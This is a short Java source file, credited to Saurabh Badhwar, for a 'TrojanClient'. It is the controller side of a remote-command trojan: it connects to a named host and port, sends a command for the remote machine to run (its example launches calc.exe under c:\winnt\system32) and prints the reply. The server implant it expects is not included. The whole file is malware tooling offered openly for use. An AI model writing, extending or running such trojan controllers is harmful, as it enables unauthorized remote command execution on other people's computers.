import java.io.*;
import java.net.*;
import javax.swing.*;

public class TrojanClient 
{
    public static void main(String []args) throws IOException 
	{
	
	if (!(args.length > 2))
	{
		System.out.println("TrojanClient created by Saurabh Badhwar");
		System.out.println("Usage: java TrojanClient <hostname> <port> <command>");
		System.out.println("Example: java TrojanClient Omegasvr 2000 c:\\winnt\\system32\\calc.exe");
		System.exit(0);
	}
	
	String host = args[0];
	String port = args[1];
	String filename = args[2];

	Socket echoSocket = null;
        PrintWriter out = null;
        BufferedReader in = null;

        try {
            echoSocket = new Socket(host, Integer.parseInt(port));
            out = new PrintWriter(echoSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(
                                        echoSocket.getInputStream()));
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host: " + host);
            System.exit(1);
        } catch (IOException e) {
            System.out.println("Couldn't get I/O for the connection to: "+ host);
            System.exit(1);
        }

		out.println(filename); //send it to the server

		String str,s ="";
		while ((str = in.readLine()) != null)
		{
		    s = s + str + "\n";
    		}
	
		System.out.println(s);
	
	out.close();
	in.close();
	echoSocket.close();
    }
}